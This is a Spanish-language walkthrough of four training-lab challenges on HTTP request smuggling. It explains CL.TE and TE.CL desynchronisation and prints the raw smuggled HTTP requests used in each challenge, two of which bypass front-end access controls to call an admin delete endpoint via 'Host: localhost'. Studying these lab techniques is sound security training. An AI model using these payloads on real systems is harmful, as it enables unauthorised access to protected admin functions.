## Reto 1: Contrabando de solicitudes HTTP, confirmación de una vulnerabilidad CL.TE mediante respuestas diferenciales


Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que se pueda realizar una solicitud posterior. /(la raíz web) activa una respuesta 404 No encontrado. 

Modificamos el `Content-Length: 41` y el `Transfer-Encoding: chunked` y añadimos un solicitud a un sitio que no existe con una cabecera de ejemplo para que sea aceptada , finalmente obtenemos el error 404.

```
POST / HTTP/1.1
Host: 0ad4003703e8c88f80e8d651003d00e3.web-security-academy.net
Content-Length: 41
Transfer-Encoding: chunked
3
abc
0
GET /error HTTP/1.1
Test: A
```

## Reto 2: Contrabando de solicitudes HTTP, confirmación de una vulnerabilidad TE.CL mediante respuestas diferenciales

Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor back-end no admite la codificación fragmentada.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que se pueda realizar una solicitud posterior. `/` (la raíz web) activa una respuesta 404 No encontrado. 

Esta variante de HTTP request smuggling basada en la combinación TE.CL, donde el front-end permite codificación chunked y el back-end no. El objetivo es verificar si existe una desincronización entre ambos servidores manipulando los encabezados de longitud y codificación de la petición.

A través de dos envíos consecutivos desde Burp Repeater, provocamos una situación donde la segunda petición se ve afectada por los restos interpretados desde la primera, desencadenando una respuesta 404 inesperada en la raíz del sitio. 
```
POST / HTTP/1.1
Host: 0a5a00c8041eb13b81eaac5a007c0028.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4
38
POST /error HTTP/1.1
Content-Length: 30
testing=test
0
```
## Reto 3: Explotación del contrabando de solicitudes HTTP para eludir los controles de seguridad del frontend, vulnerabilidad CL.TE

Este laboratorio implica un servidor front-end y uno back-end, y el servidor front-end no admite la codificación fragmentada. Hay un panel de administración en /admin, pero el servidor front-end bloquea el acceso a él.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end que accede al panel de administración y elimina al usuario. carlos. 

Aplicamos la técnica de HTTP request smuggling con una combinación CL.TE para evadir controles de acceso impuestos por el front-end. El objetivo es acceder al panel de administración, normalmente restringido, y eliminar al usuario carlos desde el back-end.

Para ello, construimos una petición maliciosa que el front-end interpreta como finalizada tras leer los bytes indicados por Content-Length, pero que en realidad contiene una segunda petición HTTP embebida. Esta segunda petición es procesada por el back-end de forma independiente y sin las restricciones del front-end, lo que nos permite interactuar con rutas protegidas como /admin o /admin/delete.

```
POST / HTTP/1.1
Host: 0a0d00b503aada46808c80b800650056.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Transfer-Encoding: chunked
0
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 12
test=test
```

## Reto 4: Explotación del contrabando de solicitudes HTTP para eludir los controles de seguridad del frontend, vulnerabilidad TE.CL

Este laboratorio implica un servidor front-end y uno back-end, y el servidor back-end no admite la codificación fragmentada. Hay un panel de administración en /admin, pero el servidor front-end bloquea el acceso a él.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end que accede al panel de administración y elimina al usuario. carlos. 

Explotamos una vulnerabilidad TE.CL (Transfer-Encoding + Content-Length) para realizar HTTP request smuggling y evadir las restricciones de acceso impuestas por el front-end. El objetivo es acceder a rutas protegidas como /admin o /admin/delete que no están disponibles directamente desde el navegador.

Utilizamos una petición malformada con codificación chunked para engañar al front-end y que interprete una longitud de contenido más corta de lo que realmente se está enviando. Esto permite que el back-end procese una segunda petición embebida que el front-end nunca llega a validar.

Durante la clase, mostramos cómo construir y ajustar la petición smuggled para que incluya la cabecera ‘Host: localhost‘, necesaria para que el back-end acepte la acción administrativa.

```
POST / HTTP/1.1
Host: 0a0b008303b3ce7b806a802f002c006c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4
5f
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 25
test=testing
0
```



